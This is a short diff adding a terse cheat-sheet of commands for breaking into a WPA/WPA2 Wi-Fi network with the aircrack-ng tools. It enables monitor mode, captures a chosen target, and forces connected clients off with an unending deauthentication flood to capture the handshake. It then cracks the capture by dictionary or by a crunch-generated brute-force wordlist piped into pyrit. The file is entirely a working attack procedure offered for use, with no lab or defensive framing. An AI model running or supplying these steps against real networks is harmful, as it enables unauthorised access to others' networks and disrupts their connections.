@@ -1,0 +1,19 @@
+airmon-ng check kill
+airmon-ng start wlan0
+
+airodump-ng mon0 -> get target
+
+
+while this: airodump-ng -c # --bssid XX:XX:XX:XX:XX:XX -w FILENAME mon0  -> if trouble, --ignore-negative-one mon0
+get handshake (deauth): aireplay-ng --deauth 0 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX mon0
+aircrack-ng FILENAME-01.cap (+ options, dictionary etc)
+
+
+[OPTIONAL]
+crunch 8 14 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 | pyrit -r FILENAME-01.cap -b XX:XX:XX:XX:XX:XX -i - attack_passthrough
+8 is used because of the minimum for WPA/WPA2 password length
+14 can be changed to a higher or lower value.
+FILENAME-01.cap if your specified file
+-b XX:XX:XX:XX:XX:XX is the bssid
+If you know the length of the pass word then you can enter X X
+for example, if i knew the password was only 8 characters or numbers, I would use 8 8.
